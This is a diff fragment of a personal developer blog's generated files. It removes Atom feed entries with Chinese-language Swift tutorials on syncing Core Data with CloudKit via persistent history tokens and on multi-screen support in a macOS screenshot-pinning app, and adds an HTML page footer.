-    super.viewDidLoad()
-		NotificationCenter.default.addObserver(self,
-                                           selector: #selector(self.handleRemoteData(_:)),
-                                           name: .NSPersistentStoreRemoteChange,
-                                           object: CoreUtil.container.persistentStoreCoordinator)
-}
-</code></pre>
-<p>实现对通知的处理：</p>
-<pre><code class="language-swift">@objc func handleRemoteData(_ notification: Notification) {
-    guard let info = notification.userInfo
-    else {
-        return
-    }
-    // ... 一些处理
-}
-</code></pre>
-<p>在默认情况下，当App接收到新的变化时，是不会merge到当前的context之中的，但是会保留一个history，作为云端数据变化的记录。为了让源端数据合并，我们可以使用以下两个方法：</p>
-<h2 id="方法一为context设置自动合并不推荐">方法一：为context设置自动合并（不推荐）</h2>
-<p>一个比较简单的实现方法是为context设置自动合并，但是官方并不推荐这种做法：</p>
-<pre><code class="language-swift">container.persistentStoreDescriptions = [description]
-container.loadPersistentStores(completionHandler: {
-    (storeDescription, error) in
-    if let error = error as NSError? {
-        fatalError(&quot;Unresolved error \(error), \(error.userInfo)&quot;)
-    }
-})
-// 不推荐的做法
-container.viewContext.automaticallyMergesChangesFromParent = true
-return container
-</code></pre>
-<p>当App收到远端的变化时，会自动的将变化merge到context之中，值得注意的是，这个merge的过程是在<strong>子线程异步执行的</strong>。所以在我们的handle函数执行的时候，这个merge的行为<strong>并不一定完成</strong>。</p>
-<pre><code class="language-swift">@objc func handleRemoteData(_ notification: Notification) {
-    guard let info = notification.userInfo
-    else {
-        return
-    }
-		DispatchQueue.main.async {
-        [unowned self] in
-        // 此时merge可能还未完成
-        self.tableView.reloadData()
-    }
-}
-</code></pre>
-<p>另外，这个handle函数也会在子线程进行，所以对tableView的刷新要在主线程中异步进行。</p>
-<p>值得注意的是，因为一些机制（我还未探究原因），远端在<strong>一次</strong>数据变化后，会发送<strong>多个</strong>通知到App，这个handle函数也会执行多次，如果按照这样实现的话其实是可以达到刷新出新数据的效果的（在第2次执行这个函数的时候，之前的merge可能已经完成了），但多次的刷新势必会带来一定的性能损耗。</p>
-<p>一个想法是在CoreUtil中设置一个lastToken，根据userInfo里的token信息来判断是否已经获取过本次数据变化：</p>
-<pre><code class="language-swift">@objc func handleRemoteData(_ notification: Notification) {
-    guard let info = notification.userInfo,
-          let token = info[&quot;historyToken&quot;] as? NSPersistentHistoryToken,
-          token != CoreUtil.lastToken
-    else {
-        return
-    }
-    guard let trans = CoreUtil.getLatestTransaction(token: token) else {return}
-    DispatchQueue.main.async {
-        [unowned self] in
-        // 此时merge可能还未完成
-        self.tableView.reloadData()
-        CoreUtil.lastToken = token
-    }
-}
-</code></pre>
-<p>但是面临着一个同样的问题，我们并不能知道在哪一次的通知中数据才被merge到context之中，所以草率地在reloadData()后修改lastToken，并不会让tableView得到最新的数据。（这也是我踩过的坑）</p>
-<h2 id="手动merge远端变化">手动Merge远端变化</h2>
-<p>按照官方文档的建议，还是需要手动merge远端的变化，然后再执行相应的UI操作。</p>
-<p>在CoreUtil中，我们将lastToken保存在文件中，每次读取的时候从文件中查看当前最新的token信息：</p>
-<pre><code class="language-swift">final class CoreUtil: NSObject {
-    
-    // MARK: - Core Data Context
-    static let container = (UIApplication.shared.delegate as! AppDelegate).persistentContainer
-    static let context = container.viewContext
-
-    // 暂时不展开token
-    static var lastToken: NSPersistentHistoryToken? = nil {
-        didSet{
-            guard let token = lastToken,
-                  let data = try? NSKeyedArchiver.archivedData(withRootObject: token, requiringSecureCoding: true)
-            else { return }
-            do {
-                try data.write(to: tokenFile)
-            } catch {
-                fatalError(error.localizedDescription)
-            }
-        }
-    }
-    static var tokenFile: URL = {
-        let url = NSPersistentContainer.defaultDirectoryURL().appendingPathComponent(&quot;TapMemo&quot;, isDirectory: true)
-        if !FileManager.default.fileExists(atPath: url.path) {
-            do {
-                try FileManager.default.createDirectory(at: url, withIntermediateDirectories: true, attributes: nil)
-            } catch {
-                fatalError(error.localizedDescription)
-            }
-        }
-        return url.appendingPathComponent(&quot;token.data&quot;, isDirectory: false)
-    }()
-
-    // ..数据库操作
-    // ...
-}
-</code></pre>
-<p>在监听通知时，我们需要做以下几件事情：</p>
-<ol>
-<li>通过判断当前token和最新的token是否一致，来确定是否已经被更新过</li>
-<li>获取最新的historyRequest</li>
-<li>确保获取了这个request以后，将最新的token设置为当前收到的token</li>
-<li>获取该history中最新事务（transaction）信息</li>
-<li>merge该事务的变化</li>
-<li>在主线程中更新UI</li>
-</ol>
-<pre><code class="language-swift">@objc func handleRemoteData(_ notification:Notification) {
-    guard let info = notification.userInfo,
-          let token = info[&quot;historyToken&quot;] as? NSPersistentHistoryToken,
-          token != CoreUtil.lastToken
-    else {
-        return
-    }
-    let fetchHistoryRequest = NSPersistentHistoryChangeRequest.fetchHistory(after: self.token)
-    CoreUtil.lastToken = token
-    let context = CoreUtil.context
-    guard
-        let historyResult = try? context.execute(fetchHistoryRequest)
-            as? NSPersistentHistoryResult,
-        let history = historyResult.result as? [NSPersistentHistoryTransaction]
-    else {
-        print(&quot;Could not convert history result to transactions.&quot;)
-        return
-    }
-    guard history.count &gt; 0,
-          let trans = history.last
-    else {
-        return
-    }
-    CoreUtil.context.perform {
-        CoreUtil.context.mergeChanges(fromContextDidSave: trans.objectIDNotification())
-        DispatchQueue.main.async {
-            [unowned self] in
-            self.tableView.reloadData()
-        }
-    }
-}
-</code></pre>
-<p>这样我们就可以在多个设备中同步信息啦！</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[Clipin Log 6. 多屏幕支持]]></title>
-        <id>https://hagemon.github.io/post/clipin-post-6/</id>
-        <link href="https://hagemon.github.io/post/clipin-post-6/">
-        </link>
-        <updated>2021-01-09T13:44:43.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="多屏幕环境">多屏幕环境</h2>
-<p>在多屏幕环境下，各个屏幕的起始坐标<code>origin</code>会根据用户在系统偏好设置中对显示器排列的设置而不同，下图直观地表示了多屏幕环境下各屏幕的坐标。</p>
-<figure data-type="image" tabindex="1"><img src="https://hagemon.github.io/post-images/1613224003347.png" alt="" loading="lazy"></figure>
-<p>通过<code>screen.visibleFrame</code>可以访问屏幕在此坐标系下的frame。</p>
-<h2 id="实现思路">实现思路</h2>
-<ul>
-<li>在ClipManager.shared.start()中检测所有屏幕并创建控制器</li>
-<li>对于每个控制器，获取对应显示器当前页面图像</li>
-<li>在执行Pin操作时，需要将窗口偏移到正确的位置</li>
-</ul>
-<pre><code class="language-swift">class ClipManager {
-	// ....    
-    var controllers: [ClipWindowController] = []
-    // ....
-    func start() {
-        NotificationCenter.default.post(name: NotiNames.pinNormal.name, object: nil)
-        NSApplication.shared.activate(ignoringOtherApps: true)
+            
         
-        for screen in NSScreen.screens {  // 获取所有屏幕
-            let view = ClipView(frame: screen.frame)
-            let clipWindow = ClipWindow(contentRect: screen.frame, contentView: view)
-            let clipWindowController = ClipWindowController(window: clipWindow)
-            controllers.append(clipWindowController)
-            self.status = .ready
-            clipWindowController.capture(screen)
-        }
+            
+        
+            
+        
+    </div>
+    <div class="footer-info">
+        To be continued
+    </div>
+    <div>
+        Theme by <a href="https://imhanjie.com/" target="_blank">imhanjie</a>, Powered by <a
+                href="https://github.com/getgridea/gridea" target="_blank">Gridea | <a href="https://hagemon.github.io/atom.xml" target="_blank">RSS</a></a>
+    </div>
+</div>
 
-    }
-    
-    // ....
-}
-</code></pre>
-<p>在ClipWindowController中获取各屏幕的图像：</p>
-<pre><code class="language-swift">class ClipWindowController: NSWindowController {
-	func capture(_ screen:NSScreen) {
-        guard let window = self.window else { return }
-        //  获取screen对应的displayID和ID对应的图像
-        guard let displayID = screen.deviceDescription[NSDeviceDescriptionKey(rawValue: &quot;NSScreenNumber&quot;)] as? CGDirectDisplayID,
-                let cgScreenImage = CGDisplayCreateImage(displayID)
-        else { return }
-        self.screenImage = NSImage(cgImage: cgScreenImage, size: screen.frame.size)
-        window.backgroundColor = NSColor(white: 0, alpha: 0.5)
-        self.clipView = window.contentView as? ClipView
-        self.showWindow(nil)
-    }
-}
-</code></pre>
-<p>在PinManager中修改pin函数，将屏幕起始坐标增加为新的参数，并对pin窗口进行偏移：</p>
-<pre><code class="language-swift">class PinManager: NSObject {
-	func pin(rep: NSBitmapImageRep, rect:NSRect, screenOrigin:NSPoint) {
-        let image = NSImage(size: rect.size)
-        image.addRepresentation(rep)
-        let view = PinView(image: image)
-        let window = PinWindow(rect: rect, contentView: view)
-        let controller = PinWindowController(window: window)
-        self.controllers.append(controller)
-        // 以屏幕左下角坐标为基准，偏移pin窗口
-        window.setFrameOrigin(screenOrigin.offsetBy(dx: rect.origin.x, dy: rect.origin.y))
-        controller.showWindow(nil)
-        NotificationCenter.default.post(name: NotiNames.pinEnd.name, object: nil)
-    }
-}
-</code></pre>
-<p>同时在调用pin函数时增加对屏幕起始坐标参数的传入：</p>
-<pre><code class="language-swift">// ClipWindowController.swift
-@objc func done() {
-    guard let view = self.clipView,
-          let rect = view.drawingRect
-    else {
-        return
-    }
-    guard let bitmapRep = view.bitmapImageRepForCachingDisplay(in: rect),
-          let window = self.window,
-          let screen = window.screen
-    else {return}
-    view.cacheDisplay(in: rect, to: bitmapRep)
-    PinManager.shared.pin(rep: bitmapRep, rect: rect, screenOrigin: screen.visibleFrame.origin)
-}
-</code></pre>
-<p>接下来是<a href="https://hagemon.github.io/post/clipin-post-7/">对截屏的一些优化</a></p>
-]]></content>
-    </entry>
-</feed>
+<script>
+  hljs.initHighlightingOnLoad()
+</script>
+
+    </div>
+</div>
+</body>
+</html>
